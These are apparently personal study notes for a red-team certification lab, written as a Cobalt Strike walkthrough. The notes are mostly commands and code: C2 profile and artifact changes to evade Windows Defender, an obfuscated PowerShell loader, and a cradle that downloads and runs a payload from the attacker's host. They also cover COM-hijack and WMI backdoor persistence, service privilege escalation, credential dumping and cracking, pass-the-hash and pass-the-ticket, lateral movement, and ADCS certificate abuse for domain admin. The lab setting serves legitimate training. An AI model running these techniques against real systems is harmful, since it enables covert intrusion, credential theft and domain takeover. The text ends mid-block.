# CRTO-Notes

Notes for CRTO

## Create Listener CS

Http

    Name: http
    Payload: Beacon HTTP
    HTTP Hosts: www.bleepincomputer.com
    HTTP Host (Stager) : www.bleepincomputer.com

SMB

    Name: smb
    Payload: Beacon SMB
    Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

TCP

    Name: tcp
    Payload: Beacon TCP
    Port: 4444
    Bind to localhost: False

TCP (local)

    Name: tcp-local
    Payload: Beacon TCP
    Port: 1337
    Bind to localhost: True

<img width="1069" height="578" alt="image" src="https://github.com/user-attachments/assets/a10ff89b-9fd4-4188-80fa-0458ea6703c9" />

Generate payloads for each listener.

    Go to Payloads > Windows Stageless Generate All Payloads
    Folder: C:\Payloads
    Click Generate
    
<img width="1064" height="244" alt="image" src="https://github.com/user-attachments/assets/5b9287ea-8be8-43d5-aba3-2ff23a1b8f5f" />

### Defence Evasion
## Malleable C2
Open a new PowerShell window in Terminal.
    SSH into the team server VM.
        ssh attacker@10.0.0.5
        The password is Passw0rd!.

    Move into the profiles directory.
        cd /opt/cobaltstrike/profiles

    Open default.profile in a text editor (e.g. vim or nano).

    Add the following stage block:
#### Tambahin paling bawah 
    Profile
    TypeCopy
    stage {
        set userwx "false";
        set cleanup "true";
        set copy_pe_header "false";
        set module_x64 "Hydrogen.dll";

        transform-x64 {
            strrep "beacon.x64.dll" "bacon.x64.dll";
            strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
            strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
            strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
            strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
        }
    }

    Add the following post-ex block:

    Profile
    TypeCopy
    post-ex {
        set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
        set cleanup "true";
        set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
        set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
        set amsi_disable "true";

        transform-x64 {
            strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
            strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
            strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
            strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
            strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
        }
    }

    Add the following process-inject block:

    Profile
    TypeCopy
    process-inject {
        set allocator "VirtualAllocEx";
        set bof_allocator "VirtualAlloc";
        set bof_reuse_memory "true";
        set min_alloc "8192";
        set startrwx "false";
        set userwx "false";

        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
            NtQueueApcThread-s;
            NtQueueApcThread;
            SetThreadContext;
        }
    }
Save the changes.
Restart the team server.
        sudo /usr/bin/docker restart cobaltstrike-cs-1

    Check the container logs to ensure there are no profile errors.
        sudo /usr/bin/docker logs cobaltstrike-cs-1

## Artifact Kit

    Launch Visual Studio Code.

    Go to File > Open Folder and select C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

    Navigate to src-common and open patch.c.

    Scroll to line ~45 and modify the for loop. This is for the svc exe payloads.

    c
    TypeCopy
    x = length;
    while ( x-- ) {
      * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

    Scroll to line ~116 and modify the other for loop. This is for the normal exe payloads.

    c
    TypeCopy
    int x = length;
    while ( x-- ) {
      * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

Save the changes (File > Save) and close the folder (File > Close Folder).

On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.
Change the working directory.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

    Run build.sh to build the new artifacts.
    ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

## Load the Aggressor Script.
      Open the Cobalt Strike client.
      Go to Cobalt Strike > Script Manager.
      Click Load.
      Navigate to C:\Tools\cobaltstrike\custom-artifacts\mailslot and select artifact.cna.


    
### Resource Kit
If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.
Change the working directory on unbuntu.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
Run build.sh to copy the resource templates.
        ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
If not already open from the previous task, launch Visual Studio Code.
Go to File > Open Folder and select C:\Tools\cobaltstrike\custom-resources.
## Select template.x64.ps1.
Scroll to line 5 and replace .Equals('System.dll') with .Equals('Sys'+'tem.dll').
Scroll to line 32 and replace it with:
    $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

Save the changes (File > Save).
Select compress.ps1.


### Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:
PowerShell
    SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

Save the changes (File > Save).
    Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.
Testing

    Host a 64-bit PowerShell payload.
        Go to Attacks > Scripted Web Delivery
        Select the http listener.
        Click Launch.

    Switch to Workstation and login with Passw0rd!.

    Open a PowerShell window.

    Download and invoke the PowerShell payload.

PowerShell
    iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")

    Switch back to Attacker Desktop and a new Beacon should be checking in.

    From the new Beacon, impersonate a local admin to lon-ws-1.
        make_token CONTOSO\rsteel Passw0rd!

    Change the spawnto for the service payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

    Move laterally to lon-ws-1.
        jump psexec64 lon-ws-1 smb

<img width="1062" height="526" alt="image" src="https://github.com/user-attachments/assets/add66db3-6b75-48d1-badd-098f71736af4" />

    In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.

# Initial Access

## Persistence

    Generate a DLL payload:
        Payloads > Windows Stageless Payload
        Listener: http
        Output: Windows DLL
        Exit Function: Thread
        Click Generate.
        Save it to C:\Payloads\http_x64.dll.

    We choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.


## COM Hijack

From the Beacon running as pchilds:

Change Beacon's working directory.

beacon
        cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
Upload the DLL payload to disk.
        upload C:\Payloads\http_x64.dll
Rename and timestomp the DLL to help it blend in with the existing files.
        mv http_x64.dll Microsoft.Teams.HttpClient.dll
        timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
Add the registry entries to perform the COM hijack:    
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

Switch to Workstation 1 and login with Passw0rd!. From the Windows start menu, launch Microsoft Teams.
Switch back to the Attacker Desktop and a new Beacon should appear from ms-teams.exe.
In this lab, you have leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.

# Privesc
## Enumeration
The objective of this lab is to exploit weak registry permissions on a service for privilege escalation.
Interact with the Beacon running as pchilds.
Change the spawnto to msedge.
    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Use PowerShell to search for services where low-priv users have FullControl rights.
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

return : This should return BadWindowsService.
<img width="755" height="245" alt="image" src="https://github.com/user-attachments/assets/4cb7cff0-dec8-4064-99e0-848b6f4c87dc" />

## Exploitation
Set the spawnto for the service binary payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
Generate a service binary payload.
        Payloads > Windows Stageless Payload.
        Listener: http
        Output: Windows Service EXE
        Click Generate
        Save to C:\Payloads\http_x64.svc.exe
Stop the service.
        sc_stop BadWindowsService
Change Beacon's current working directory.
        cd C:\Temp
Upload the payload to disk.
        upload C:\Payloads\http_x64.svc.exe
Get the service's current binary path.
        sc_qc BadWindowsService
Reconfigure the service to point to the payload.
        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
Start the service.
        sc_start BadWindowsService
The elevated Beacon should appear within a few seconds.
<img width="972" height="503" alt="image" src="https://github.com/user-attachments/assets/e01a662b-0b0e-4b91-b111-2c739019fc6b" />

Restore the service's binary path.
beacon
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2 
Delete the service payload.
    rm http_x64.svc.exe
Start the service again.
    sc_start BadWindowsService

In this lab, you have abused a weak service permission for privilege escalation.

# Post-Ex
## Session passing
Use:    spawn [x86|x64] [listener]
        spawn [listener]

Spawn an x86 or x64 process and inject shellcode for the listener.

beacon> spawn x64 http


    
# Privesc - lab
beacon
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

Set the spawnto for the service binary payload.
    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Generate a service binary payload.
        Payloads > Windows Stageless Payload.
        Listener: http
        Output: Windows Service EXE
        Click Generate
        Save to C:\Payloads\http_x64.svc.exe

Stop the service.
        sc_stop BadWindowsService

Change Beacon's current working directory.
        cd C:\Temp

Upload the payload to disk.
        upload C:\Payloads\http_x64.svc.exe

Get the service's current binary path.
        sc_qc BadWindowsService

Reconfigure the service to point to the payload.
        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2

Start the service.
        sc_start BadWindowsService

The elevated Beacon should appear within a few seconds.
Restore the service's binary path.
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2

Delete the service payload.
        rm http_x64.svc.exe

Start the service again.
        sc_start BadWindowsService

# Elevate Persis
WMI Event Subscription
Launch Visual Studio Code or PowerShell ISE.
Create a new file.
Paste the following code:

    function Add-WmiPersistence
    {
       $EventFilterArgs = @{
          EventNamespace = 'root/cimv2'
          Name = "Debug Trace"
          Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
          QueryLanguage = 'WQL'
       }

       $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

       $CommandLineConsumerArgs = @{
          Name = "Debug Consumer"
          CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
       }

       $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

       $FilterToConsumerArgs = @{
          Filter = $Filter
          Consumer = $Consumer
       }

       Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
    }

    function Remove-WmiPersistence
    {
        Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
    }

This will trigger when the computer updates its Group Policy Objects.
Save the script as C:\Tools\WmiPersistence.ps1.
Launch Cobalt Strike and connect to the team server.
    Generate a DNS payload.
        Payloads > Windows Stageless Payload
        Listener: dns
        Click Generate
        Save to C:\Payloads\dns_x64.exe

Interact with the SYSTEM Beacon.
Upload the payload.
        upload C:\Payloads\dns_x64.exe
        mv dns_x64.exe windbg.exe

Install the backdoor (using self-injection).
        powershell-import C:\Tools\WmiPersistence.ps1
        psinject [BEACON PID] x64 Add-WmiPersistence

Trigger the backdoor (can be done in Beacon)
        execute gpupdate /target:computer /force

A new DNS Beacon should appear within a few seconds.
Remove the persistence
        psinject [BEACON PID] x64 Remove-WmiPersistence

In this lab, you have leveraged a WMI event subscription to execute a payload when the computer refreshes its Group Policy Objects.

# Credential Access
## Credentials from Web Browsers
    execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

## Windows Credential Manager
    beacon> run vaultcmd /listcreds:"Windows Credentials" /all
    execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
    execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
## OS Credential Dumping
### LSASS Memory (NTLM Hashes)
    mimikatz sekurlsa::logonpasswords
    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
fc525c9683e8fe067095ba2ddc971889:Passw0rd!

## Kerberos Keys
Mimikatz's sekurlsa::ekeys command will dump user's Kerberos encryption keys.
// Note that Mimikatz incorrectly labels each hash as des_cbc_md4.  The hash at the top has a length of 64 and is aes256-cts-hmac-sha1-96.  You may also see aes128-cts-hmac-sha1-96 and rc4_hmac which are 32 in length.

The hash format required by Hashcat is 
    $krb5db$18$<username>$<DOMAIN-FQDN>$<hash> and can be cracked using hash mode 28900.

    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!


## OPSEC
The GrantedAccess mask of 0x1010 is consistent with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, which are the minimum privileges required for reading memory.

## Security Account Manager
    mimikatz !lsadump::sam
## LSA Secrets

mimikatz !lsadump::secrets

## Cached Domain Credentials
mimikatz !lsadump::cache
// Take note of the number of iterations the passwords are hashed with, as this is required when attempting to crack them.  The default (as indicated by the output above) is 10240.
    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!

## Kerberos Tickets
### AS-REP Roasting
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
// By default, Rubeus outputs hashes for John the Ripper.  Use /format:hashcat to output them for Hashcat instead.

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
$krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!
### Kerberoasting
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
These hashes can be cracked using hashcat's 13100 hash mode.
    .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
    
### A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.
Another effective strategy is to create one or more dummy SPNs that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them.  Since most tools automatically enumerate and roast every account in a domain with an SPN set, a careless adversary can trigger this high-fidelity alert.
    
    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
### Extracting Tickets
If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' triage command will enumerate every logon session present and their associated tickets.  If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
    
// Rubeus' dump command with no additional parameters will extract every single ticket.  Use the /service and/or /luid parameters to target a specific service and/or logon session.  Tickets with krbtgt as the service are TGTs, other tickets are service tickets.
    
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80(user domain admin) /service:krbtgt /nowrap

### Renewing TGTs
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap

## BOFs

RalfHacker has a number of Kerberos BOFs that are useful for instances where you don't want to use Rubeus with execute-assembly.  The included Aggressor scripts adds a few new Beacon commands, such as krb_triage and krb_dump.
Import script pada C:/tools
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    
# User Impersonate
## Token Impersonation
    make_token CONTOSO\rsteel Passw0rd!
To instruct Beacon to stop impersonating a token, whether made or stolen, run the rev2self command.  This calls the RevertToSelf API under the hood.
    ps
    token-store steal (pid)
     token-store use (id) / nomor yang muncul
## PTH
    sekurlsa::pth.
    pth [DOMAIN\user] [hash]
    pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
    * Jika gagal
    mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
    steal_token 1188(pid dari proses pth)
    ls \\lon-ws-1\c$
    rev2self
    kill pid (1188)
    
## PTT
### Requesting TGTs
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
### Injecting TGTs
Beacon has a kerberos_ticket_use command
    $ticket = "doIFo[...snip...]kNPTQ=="
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
    run klist
    make_token CONTOSO\rsteel FakePass
    run klist
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
kerberos_ticket_purge.  When we no longer need the session, use rev2self to dispose of it, and the Beacon session goes back to pchilds' context.

### The Rubeus way
ptt /luid:[luid] /ticket:[ticket]. 
// Rubeus also has a createnetonly command which can be used instead of Beacon's make_token.  This spawns a hidden process in a new logon session and returns the PID and LUID.
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
The process can be created and the ticket injected in a single command:
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:do..Snip...TNPTQ==
    steal_token 2524(pid hasil dari rubeus)
 To drop the impersonation, run rev2self and then terminate the spawned process using Beacon's kill command.

### Process Injection
Find a target process using the ps command or the process explorer, then inject shellcode for the given listener into it.
    ps
    inject (pid)5248 x64(aristektur) http(payload)
    
### The lab
Interact with the SYSTEM Beacon.
Attempt to list the C$ share on lon-ws-1.
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
Pass the Ticket
    make_token CONTOSO\rsteel FakePass
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    run klist
    ls \\lon-ws-1\C$
    rev2self

# Discovery
## Bloodhound
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptorattacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/
buka ubuntu
    Desktop$ scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
    attacker@10.0.0.5's password: Passw0rd!
    attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ bofhound -i logs/
    attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ls -l
    MATCH (n:User) WHERE n.hasspn=true RETURN n
A WMI filter is applied to a GPO by modifying the GPO's gPCWQLFilter attribute.
    ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter

# Lateral Movement
## jump
The syntax is jump [exploit] [target] [listener].  Running the command by itself will show the 'exploits' that are available (these are not really exploits, rather 'techniques').
    jump [exploit] [target] [listener]
## remote-exec
The syntax is remote-exec [method] [target] [command].
    remote-exec [method] [target] [command].
## Windows Remote Management
// Beacons executed via WinRM will run in the context of the current or impersonated user.
     jump winrm64 lon-ws-1 smb
WinRM is also the only remote-exec method that returns output, so it could be used for remote enumeration.
    remote-exec winrm lon-ws-1 net sessions     
## PsExec
    jump psexec64 lon-ws-1 smb
// Beacons executed via PsExec will always run as SYSTEM.
## custom Technique
    jump
    <img width="751" height="302" alt="image" src="https://github.com/user-attachments/assets/80149f40-22dd-4fab-b5a6-2805da66e15c" />
    jump scshell64 lon-ws-1 smb
## LOLBAS
This utility can be abused to inject any arbitrary DLL into a target process, using the syntax mavinject.exe [PID] /INJECTRUNNING [DLL PATH].  First, use remote-exec to list the running processes on the remote target.
    remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
Then, upload a DLL payload to the target and use MavInject to inject it into your chosen process.
    beacon> cd \\lon-ws-1\ADMIN$\System32
    beacon> upload C:\Payloads\smb_x64.dll

    beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
Started process 1608 on lon-ws-1

    beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
<img width="946" height="99" alt="image" src="https://github.com/user-attachments/assets/b0ea6007-a9a0-41a8-9057-69f2a54f5902" />

Most mature organisations have a good handle on LOLBAS abuses.  They can be blocked outright using application control technologies such as AppLocker and WDAC, or their use simply logged via process creation events generated by Sysmon or other monitoring tools.  For those reasons, the use of LOLBAS is generally more applicable to adversary emulation rather than simulation.
## Security Logon Types
    powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
    powerpick Get-DomainTrust
    
## The lab LateralMov
Impersonate the rsteel user.
    make_token CONTOSO\rsteel Passw0rd!
Load the SCShell Aggressor script.
Go to Cobalt Strike > Script Manager.
Click Load.
Select C:\Tools\SCShell\CS-BOF\scshell.cna.
SCShell uses the service binary payload, so make sure to set the spawnto first.
    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
    jump schell64 lon-ws-1 smb
# Pivoting
SOCKS
    socks 1080
<img width="971" height="593" alt="image" src="https://github.com/user-attachments/assets/2cd7ea64-56b2-4b5d-86da-a29c10262964" />

<img width="969" height="585" alt="image" src="https://github.com/user-attachments/assets/bf949045-e541-43de-9475-fee5eac9f675" />


# ADCS ESC1 lab
Enumerate the certificate authority for vulnerable templates.
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
This should reveal a template called ESC1.
Request a certificate, specifying the default domain Administrator's UserPrincipalName in the certificate's Subject Alternative Name (SAN).
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
Use Rubeus to request a TGT for Administrator.
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
In this lab, you have learned how to identify and exploit ESC1 to gain domain admin privileges.

# ADCS ESC8
## Enumerate the certificate authority for vulnerabilities.
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
This will show that lon-cs-1 is vulnerable to ESC8.
Use Beacon to start a SOCKS proxy.
    socks 1080 socks5
Run netstat to see that port 445 is currently bound.
Set the lanmanserver service's start mode to disabled to prevent it from automatically restarting.
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
Stop these services in the following order to unbind port 445.
    sc_stop lanmanserver
    sc_stop srv2
    sc_stop srvnet
Run netstat and verify that 445 is no longer bound.
Start a reverse port forward that will bind to port 445 and redirect the traffic to 127.0.0.1:7445 on the attacker desktop.
    rportfwd_local 445 localhost 7445
    netstat will show 445 being bound again, but the PID will be that of the Beacon.
Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation. Add the rule:
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
    docker container start -i kali-1
Configure proxychains to use Cobalt's SOCKS proxy.
Open /etc/proxychains.conf in vim or nano.
Scroll to the last line. 
Replace the default socks4 entry with 
    socks5 10.0.0.5 1080
Save the changes.

Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint. We're going to relay the credentials of a domain controller, so we'll specifically request a DomainController certificate.
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
While that is waiting, go back to Beacon.
Coerce the domain controller into authenticating to the current machine.

    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy. A file called LON-DC-1.pfx should be created.
Press Ctrl+C to stop ntlmrelayx.    
Stop the SOCKS proxy.
    socks stop
Stop the reverse port forward.
    rportfwd stop 445
Restore the services back to default.
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    sc_start srvnet
    sc_start srv2
    sc_start lanmanserver
# DPERSIST1 - LAB



## Cleanup
Remove the firewall rule.
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
In this lab, you have learned how to identify and exploit ESC8 through a C2.

===========================================================
# thelab - Defence Evasion
The objective for this lab is to modify Cobalt Strike's artifacts, resources and C2 profile, to make Beacon more resilient against Windows Defender.
SSH into the team server VM.
    ssh attacker@10.0.0.5
The password is 
    Passw0rd!
Move into the profiles directory.
    cd /opt/cobaltstrike/profiles
Open default.profile in a text editor (e.g. vim or nano).
Add the following stage block:

    stage {
        set userwx "false";
        set cleanup "true";
        set copy_pe_header "false";
        set module_x64 "Hydrogen.dll";
    
        transform-x64 {
            strrep "beacon.x64.dll" "bacon.x64.dll";
            strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
            strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
            strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
            strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
        }
    }
    
    post-ex {
